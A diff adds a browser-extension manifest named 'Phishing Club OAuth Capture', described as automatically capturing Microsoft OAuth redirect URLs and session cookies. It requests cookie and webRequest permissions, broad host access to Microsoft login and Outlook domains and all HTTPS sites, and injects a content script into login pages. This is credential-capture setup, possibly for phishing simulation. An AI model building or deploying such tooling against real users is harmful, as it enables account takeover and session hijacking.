@@ -1,0 +1,57 @@
+{
+  "manifest_version": 3,
+  "name": "Phishing Club OAuth Capture",
+  "version": "1.0.0",
+  "description": "Automatically captures Microsoft OAuth redirect URLs and session cookies for Phishing Club",
+  "permissions": [
+    "tabs",
+    "activeTab",
+    "webRequest",
+    "storage",
+    "notifications",
+    "cookies"
+  ],
+  "host_permissions": [
+    "https://login.microsoftonline.com/*",
+    "https://login.live.com/*",
+    "https://account.live.com/*",
+    "https://outlook.live.com/*",
+    "https://outlook.office365.com/*",
+    "https://outlook.office.com/*",
+    "https://substrate.office.com/*",
+    "https://*.live.com/*",
+    "https://*.office.com/*",
+    "https://*.office365.com/*",
+    "https://*.microsoftonline.com/*",
+    "https://*.cloud.microsoft.com/*",
+    "http://localhost:*/*",
+    "https://*/*"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "action": {
+    "default_popup": "popup.html",
+    "default_icon": {
+      "16": "icons/icon16.png",
+      "48": "icons/icon48.png",
+      "128": "icons/icon128.png"
+    }
+  },
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  },
+  "content_scripts": [
+    {
+      "matches": [
+        "https://login.microsoftonline.com/*",
+        "https://login.live.com/*",
+        "https://account.live.com/*"
+      ],
+      "js": ["content.js"],
+      "run_at": "document_end"
+    }
+  ]
+}
